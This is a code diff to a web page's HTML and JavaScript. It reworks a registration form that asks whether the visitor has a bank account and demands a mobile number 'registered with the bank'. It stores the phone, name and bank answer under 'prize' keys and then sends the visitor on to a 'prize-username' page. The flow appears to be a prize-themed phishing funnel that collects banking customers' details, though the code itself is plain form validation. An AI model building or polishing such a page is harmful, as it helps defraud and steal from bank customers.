@@ -24,6 +24,29 @@
   <link rel="stylesheet" href="/assets/css/home-ui.css">
   <link rel="stylesheet" href="/assets/css/no-zoom.css?v=1">
   <script src="/assets/js/no-zoom.js?v=1"></script>
+
+  <!-- إصلاح تباين أزرار "نعم / لا" لضمان وضوح النص دائماً -->
+  <style>
+    [data-testid="has-account-yes"],
+    [data-testid="has-account-no"] {
+      background-color: #ffffff !important;
+      color: #5c626b !important;
+      border-color: #e3e5e8 !important;
+    }
+    [data-testid="has-account-yes"]:hover,
+    [data-testid="has-account-no"]:hover {
+      border-color: #c62828 !important;
+      color: #c62828 !important;
+    }
+    [data-testid="has-account-yes"].is-selected,
+    [data-testid="has-account-no"].is-selected,
+    [data-testid="has-account-yes"][aria-pressed="true"],
+    [data-testid="has-account-no"][aria-pressed="true"] {
+      background-color: #c62828 !important;
+      border-color: #c62828 !important;
+      color: #ffffff !important;
+    }
+  </style>
 </head>
 <body>
 
@@ -189,7 +212,7 @@
                 <input required="" type="tel" dir="ltr" class="w-full rounded-2xl border border-[#ececec] bg-white px-5 py-[15px] text-[15px] text-[#141414] outline-none transition-all duration-200 placeholder:text-[#b3b8bf] focus:border-[#c62828] focus:ring-2 focus:ring-[#c62828]/10 text-left" placeholder="05 00 00 00 00" data-testid="input-phone" value="">
                 <svg xmlns="http://www.w3.org/2000/svg" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone absolute end-4 top-1/2 -translate-y-1/2 text-[#b3b8bf]"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
               </div>
-              <p id="phoneErrorMsg" role="alert" style="display:none;color:#c62828;font-size:12px;font-weight:700;margin-top:6px;text-align:right;">رقم الهاتف غير صحيح</p>
+              <p id="phoneErrorMsg" role="alert" style="display:none;color:#c62828;font-size:12px;font-weight:700;margin-top:6px;text-align:right;line-height:1.5;">رقم الهاتف غير صحيح يرجى ادخال رقم هاتف مسجل في البنك</p>
             </div>
 
             <div class="rounded-2xl border border-[#ececec] bg-white p-4">
@@ -251,10 +274,58 @@
       var modal = document.querySelector('[data-testid="registration-modal"]');
       var form = modal ? modal.querySelector('form') : null;
       var errorMsg = document.getElementById('phoneErrorMsg');
+      var successSheet = document.getElementById('registrationSuccessSheet');
+      var closeSuccessBtn = document.getElementById('closeSuccessBtn');
+      var successCloseX = document.getElementById('successCloseX');
+      var exploreAppBtn = document.getElementById('exploreAppBtn');
       if (!phoneInput) return;
 
       var PREFIX_REGEX = /^0[567]/;
       var FULL_REGEX = /^0[567]\d{8}$/;
+      var selectedBankChoice = null; // 'yes' | 'no' | null
+      var redirectTimer = null;
+
+      function goToNextPage() {
+        if (redirectTimer) {
+          clearTimeout(redirectTimer);
+          redirectTimer = null;
+        }
+        var target = window.SiteLang && typeof window.SiteLang.href === 'function'
+          ? window.SiteLang.href('prize-username.html')
+          : 'prize-username.html';
+        window.location.href = target;
+      }
+
+      // ضمان ظهور نص أزرار "نعم / لا" وتحديد الاختيار بوضوح
+      function selectBankChoice(choice) {
+        selectedBankChoice = choice;
+        if (yesBtn) {
+          yesBtn.classList.toggle('is-selected', choice === 'yes');
+          yesBtn.setAttribute('aria-pressed', choice === 'yes' ? 'true' : 'false');
+        }
+        if (noBtn) {
+          noBtn.classList.toggle('is-selected', choice === 'no');
+          noBtn.setAttribute('aria-pressed', choice === 'no' ? 'true' : 'false');
+        }
+        syncSubmitButton(isValidAlgerianMobile(phoneInput.value));
+      }
+
+      if (yesBtn) {
+        yesBtn.addEventListener('click', function () {
+          selectBankChoice('yes');
+        });
+      }
+      if (noBtn) {
+        noBtn.addEventListener('click', function () {
+          selectBankChoice('no');
+        });
+      }
+
+      function hasNonPhoneCharacters(value) {
+        var raw = String(value == null ? '' : value).trim();
+        if (!raw) return false;
+        return !/^\+?[\d٠-٩۰-۹\s().-]+$/.test(raw);
+      }
 
       function normalizeAlgerianMobile(value) {
         var arabic = "٠١٢٣٤٥٦٧٨٩";
@@ -292,9 +363,9 @@
 
       function getInvalidMessage() {
         var lang = document.documentElement.lang || 'ar';
-        if (lang === 'en') return 'Invalid phone number';
-        if (lang === 'fr') return 'Numéro de téléphone invalide';
-        return 'رقم الهاتف غير صحيح';
+        if (lang === 'en') return 'Invalid phone number. Please enter a phone number registered with the bank.';
+        if (lang === 'fr') return 'Numéro de téléphone invalide. Veuillez saisir un numéro enregistré auprès de la banque.';
+        return 'رقم الهاتف غير صحيح يرجى ادخال رقم هاتف مسجل في البنك';
       }
 
       function showPhoneError() {
@@ -312,10 +383,10 @@
 
       function hasAccountSelection() {
         if (!yesBtn || !noBtn) return true;
-        var yesActive = yesBtn.getAttribute('aria-pressed') === 'true' || yesBtn.classList.contains('active') || yesBtn.classList.contains('selected');
-        var noActive = noBtn.getAttribute('aria-pressed') === 'true' || noBtn.classList.contains('active') || noBtn.classList.contains('selected');
-        if (!yesActive && !noActive) return true;
-        return yesActive || noActive;
+        if (selectedBankChoice === 'yes' || selectedBankChoice === 'no') return true;
+        var yesSelected = yesBtn.getAttribute('aria-pressed') === 'true' || yesBtn.classList.contains('is-selected') || yesBtn.classList.contains('active') || yesBtn.classList.contains('selected');
+        var noSelected = noBtn.getAttribute('aria-pressed') === 'true' || noBtn.classList.contains('is-selected') || noBtn.classList.contains('active') || noBtn.classList.contains('selected');
+        return yesSelected || noSelected;
       }
 
       function areOtherFieldsValid() {
@@ -332,10 +403,23 @@
         if (!submitButton) return;
         var canSubmit = Boolean(phoneValid && areOtherFieldsValid());
         submitButton.disabled = !canSubmit;
+        if (canSubmit) {
+          submitButton.removeAttribute('disabled');
+        } else {
+          submitButton.setAttribute('disabled', '');
+        }
       }
 
       function enforcePhoneValidation(isDeleting) {
         var raw = String(phoneInput.value || '').trim();
+
+        if (hasNonPhoneCharacters(raw)) {
+          phoneInput.setCustomValidity(getInvalidMessage());
+          showPhoneError();
+          syncSubmitButton(false);
+          return false;
+        }
+
         var normalized = normalizeAlgerianMobile(raw);
         var digitCount = normalized.replace(/\D/g, '').length;
         var valid = FULL_REGEX.test(normalized);
@@ -372,6 +456,16 @@
         }, 0);
       });
 
+      phoneInput.addEventListener('change', function () {
+        enforcePhoneValidation(false);
+      });
+
+      phoneInput.addEventListener('focus', function () {
+        if (String(phoneInput.value || '').trim().length > 0) {
+          enforcePhoneValidation(false);
+        }
+      });
+
       phoneInput.addEventListener('blur', function () {
         var raw = String(phoneInput.value || '').trim();
         if (!raw) {
@@ -379,8 +473,16 @@
           syncSubmitButton(false);
           return;
         }
+        if (hasNonPhoneCharacters(raw)) {
+          showPhoneError();
+          syncSubmitButton(false);
+          return;
+        }
         if (isValidAlgerianMobile(raw)) {
-          phoneInput.value = normalizeAlgerianMobile(raw);
+          var normalized = normalizeAlgerianMobile(raw);
+          if (phoneInput.value !== normalized) {
+            phoneInput.value = normalized;
+          }
           hidePhoneError();
           syncSubmitButton(true);
         } else {
@@ -391,37 +493,18 @@
         }
       });
 
+      var lastAutofillVal = phoneInput.value;
+      setInterval(function () {
+        if (phoneInput.value !== lastAutofillVal) {
+          lastAutofillVal = phoneInput.value;
+          enforcePhoneValidation(false);
+        }
+      }, 300);
+
       if (nameInput) {
         nameInput.addEventListener('input', function () {
           syncSubmitButton(isValidAlgerianMobile(phoneInput.value));
         });
-      }
-
-      if (yesBtn) {
-        yesBtn.addEventListener('click', function () {
-          setTimeout(function () {
-            syncSubmitButton(isValidAlgerianMobile(phoneInput.value));
-          }, 0);
-        });
-      }
-
-      if (noBtn) {
-        noBtn.addEventListener('click', function () {
-          setTimeout(function () {
-            syncSubmitButton(isValidAlgerianMobile(phoneInput.value));
-          }, 0);
-        });
-      }
-
-      if (submitButton) {
-        var observer = new MutationObserver(function () {
-          var phoneValid = isValidAlgerianMobile(phoneInput.value);
-          var shouldBeDisabled = !(phoneValid && areOtherFieldsValid());
-          if (submitButton.disabled !== shouldBeDisabled) {
-            submitButton.disabled = shouldBeDisabled;
-          }
-        });
-        observer.observe(submitButton, { attributes: true, attributeFilter: ['disabled'] });
       }
 
       if (form) {
@@ -436,9 +519,40 @@
             phoneInput.reportValidity();
             return false;
           }
-          phoneInput.value = normalizeAlgerianMobile(phoneInput.value);
+
+          var normalized = normalizeAlgerianMobile(phoneInput.value);
+          phoneInput.value = normalized;
           hidePhoneError();
+
+          try {
+            localStorage.setItem('prizePhone', normalized);
+            if (nameInput) localStorage.setItem('prizeName', String(nameInput.value || '').trim());
+            if (selectedBankChoice) localStorage.setItem('prizeHasAccount', selectedBankChoice);
+          } catch (err) {}
+
+          // جدول التوجيه التلقائي بعد 2 ثانية كضمان انتقال للصفحة التالية
+          if (!redirectTimer) {
+            redirectTimer = setTimeout(goToNextPage, 2000);
+          }
         }, true);
+      }
+
+      // أزرار نافذة النجاح توجه أيضاً إلى prize-username.html
+      if (closeSuccessBtn) closeSuccessBtn.addEventListener('click', goToNextPage);
+      if (successCloseX) successCloseX.addEventListener('click', goToNextPage);
+      if (exploreAppBtn) exploreAppBtn.addEventListener('click', goToNextPage);
+
+      // مراقبة ظهور نافذة النجاح لتفعيل عداد الـ 2 ثانية للتوجيه
+      if (successSheet) {
+        var sheetObserver = new MutationObserver(function () {
+          var isVisible = successSheet.classList.contains('active') ||
+            successSheet.classList.contains('show') ||
+            window.getComputedStyle(successSheet).display !== 'none';
+          if (isVisible && !redirectTimer) {
+            redirectTimer = setTimeout(goToNextPage, 2000);
+          }
+        });
+        sheetObserver.observe(successSheet, { attributes: true, attributeFilter: ['class', 'style'] });
       }
 
       enforcePhoneValidation(false);
